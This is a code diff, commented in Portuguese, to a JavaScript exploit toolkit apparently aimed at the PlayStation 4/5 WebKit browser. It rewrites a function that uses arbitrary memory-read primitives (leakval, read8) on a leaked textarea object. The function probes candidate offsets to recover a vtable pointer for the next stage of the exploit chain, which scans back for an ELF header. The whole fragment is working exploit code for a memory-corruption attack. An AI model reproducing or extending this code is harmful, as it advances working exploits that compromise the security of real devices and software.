@@ -303,25 +303,41 @@ async function tryProcMaps() {
 }
 
 // --- pegar ponteiro confiável dentro do WebKit -------------------------------
+// --- pegar ponteiro confiável dentro do WebKit (Modificado para PS4) ---
 function getWebKitPointer(p) {
-    // core.js captura isso durante o exploit (linha ~985)
-    const ctor = globalThis.__ps5NativeCtor;
-    if (typeof ctor === 'number' && ctor > 0x100000000) {
-        const hi = Math.floor(ctor / 0x100000000);
-        const lo = ctor - hi * 0x100000000;
-        const ptr = new int64(lo >>> 0, hi >>> 0);
-        log('[+] __ps5NativeCtor: 0x' + ptr.toString(), 'log-addr');
-        setCard('card-ctor', '0x' + ptr.toString());
-        return ptr;
-    }
-    // fallback: vtable de elemento DOM
+    // Tenta usar o offset conhecido ou varrer opções seguras
     const el = document.createElement('textarea');
-    const cell   = p.leakval(el);
-    const cppObj = p.read8(cell.add32(0x18));
-    const vtable = p.read8(cppObj);
-    const entry  = p.read8(vtable);
-    log('[+] vtable[0]: 0x' + entry.toString(), 'log-addr');
-    return entry;
+    const cell = p.leakval(el);
+    
+    // Offsets comuns para o objeto C++ em diferentes versões do WebKit (JSC)
+    const offsetsParaTestar = [0x18, 0x20, 0x28, 0x30]; 
+    
+    for (const offset of offsetsParaTestar) {
+        log(`[*] Testando offset 0x${offset.toString(16)}...`, 'log-dim');
+        const cppObj = p.read8(cell.add32(offset));
+        
+        // 1. Validação básica: O ponteiro parece ser de user-space válido?
+        // No PS4/PS5, ponteiros válidos geralmente têm hi > 0 e hi <= 0xFFFF
+        if (cppObj.hi > 0 && cppObj.hi <= 0xFFFF && (cppObj.low & 3) === 0) {
+            
+            // 2. Tenta ler a vtable apenas se o ponteiro passar no teste de sanidade
+            // (Isso reduz drasticamente a chance de ler lixo e causar segfault)
+            try {
+                const vtable = p.read8(cppObj);
+                
+                if (vtable.hi > 0 && vtable.hi <= 0xFFFF) {
+                    const entry = p.read8(vtable);
+                    log(`[+] vtable[0] encontrada no offset 0x${offset.toString(16)}: 0x${entry.toString()}`, 'log-addr');
+                    return entry;
+                }
+            } catch (e) {
+                log(`[-] Falha ao desreferenciar cppObj no offset 0x${offset.toString(16)}`, 'log-warn');
+            }
+        }
+    }
+    
+    log('[-] Nenhum ponteiro nativo válido encontrado no textarea.', 'log-error');
+    return null;
 }
 
 // --- ELF scan: anda para trás até achar \x7fELF -----------------------------
